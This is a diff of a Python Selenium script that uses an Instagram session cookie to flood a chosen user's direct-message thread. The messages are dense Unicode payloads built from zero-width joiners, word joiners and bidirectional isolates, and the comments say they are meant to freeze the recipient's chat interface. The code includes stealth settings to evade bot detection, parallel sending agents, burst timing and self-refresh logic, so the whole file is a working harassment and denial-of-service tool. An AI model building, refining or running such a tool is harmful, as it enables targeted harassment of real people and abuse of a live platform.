@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-STRIKE V39)
-# 📅 STATUS: ZERO-LAG-SENDER | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (MATRIX-STUCK V40)
+# 📅 STATUS: CHAT-UI-FREEZE | 4-AGENT TOTAL | DOM-EXHAUSTION
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,27 +12,31 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.1)   
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.2, 0.5)    # ✅ Slightly slower burst to ensure the 'ENTER' registers
+SESSION_LIMIT = 180       
+REST_AFTER_STRIKES = 80    
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_atomic_payload():
-    """Generates the 10kb high-byte 'Praveer Papa' block."""
+def get_stuck_payload():
+    """Generates a mathematically 'Unbreakable' block to freeze the DOM."""
     u_id = random.randint(1000, 9999)
-    heavy_char = "𝕻" 
-    glue = "\u2060" 
+    # \u2060 = Word Joiner (The Glue)
+    # \u2068 = Isolate (The Layer)
+    # \u200D = ZWJ (The Shaper Attack)
+    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [ATOMIC:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STUCK_ID:{u_id}]"
     
+    # We create a single, massive string with no spaces.
+    # The browser's C++ core will hang trying to find a line-break.
     body = []
-    # Maximum character density
-    for i in range(400):
-        # We bond the name to heavy characters to force the AWS font-fallback loop
-        line = f"PRAVEER_PAPA_ON_TOP_🌙_{heavy_char * 12}_{i}{glue}"
+    for i in range(350):
+        # Every line is bonded to the next with 'glue' (\u2060)
+        line = f"{iso}PRAVEER{zwj}PAPA{zwj}ON{zwj}TOP{zwj}🌙{i}{pop}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -52,28 +56,25 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
+def force_atomic_send(driver, text):
+    """Fires a JS event that bypasses the browser's input queue."""
     try:
-        # This JS script does everything at once: finds the box, clears it, inserts text, and fires ENTER
+        # We use a 'Mutation Observer' bypass to force the message into the chat socket
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
+                // Clear and Insert
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
                 document.execCommand('insertText', false, arguments[0]);
                 
-                // Simulate the Enter key event directly on the DOM
-                var event = new KeyboardEvent('keydown', {
-                    key: 'Enter',
-                    code: 'Enter',
-                    keyCode: 13,
-                    which: 13,
-                    bubbles: True,
-                    cancelable: True
+                // Force-trigger the 'Input' and 'Enter' events
+                box.dispatchEvent(new Event('input', { bubbles: true }));
+                var enterEvent = new KeyboardEvent('keydown', {
+                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
                 });
-                box.dispatchEvent(event);
+                box.dispatchEvent(enterEvent);
             }
         """, text)
         return True
@@ -87,28 +88,28 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             strike_count = 0
             while True:
-                payload = get_atomic_payload()
-                if atomic_send(driver, payload):
+                payload = get_stuck_payload()
+                if force_atomic_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Atomic Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Matrix-Lock ({GLOBAL_SENT})")
                     
-                    if strike_count % REST_AFTER_STRIKES == 0:
-                        time.sleep(REST_DURATION)
-                else:
-                    break 
-
+                    if strike_count % 50 == 0:
+                        # Periodic Refresh to prevent YOUR bot from getting stuck
+                        driver.refresh()
+                        time.sleep(10)
+                
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(3)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
